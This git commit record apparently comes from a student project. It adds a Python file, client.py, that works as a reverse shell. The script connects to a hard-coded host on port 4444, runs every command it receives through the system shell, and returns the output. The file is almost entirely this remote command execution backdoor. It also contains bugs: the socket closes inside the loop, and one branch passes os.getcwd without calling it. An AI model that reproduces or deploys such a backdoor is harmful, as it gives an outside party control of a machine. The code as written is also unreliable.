67849157da0da7350be9bd7257d76115a7ab5e8b
gunwoo07 <studentdeveloper07@gmail.com>
2022-05-28 18:53:21 +0900

    copy client

---
+++ client.py
@@ -0,0 +1,50 @@
+import os
+import socket
+import subprocess
+
+HOST = "192.168.219.117"
+BUF = 4096
+
+
+def main():
+    try:
+        host = HOST
+        port = 4444
+        s = socket.socket()
+    except socket.error as msg:
+        print("소켓 생성 에러: " + str(msg))
+        return 0
+    
+    try:
+        s.connect((host, port))
+    except socket.error as msg:
+        print("소켓 연결 에러: " + str(msg))
+        return 0
+
+    while True:
+        data = s.recv(BUF)
+
+        if data[:].decode("utf-8") == "quit":
+            s.close()
+            break
+
+        if data[:2].decode("utf-8") == "cd":
+            try:
+                os.chdir(data[3:].decode("utf-8"))
+            except:
+                pass
+
+        if len(data) > 0:
+            try:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "cp949")
+                s.send(str.encode(output_str + str(os.getcwd()) + ">"))
+            except:
+                output_str = "명령이 실행되지 않았습니다.\n"
+                s.send(str.encode(output_str + str(os.getcwd) + ">"))
+
+        s.close()
+
+
+main()
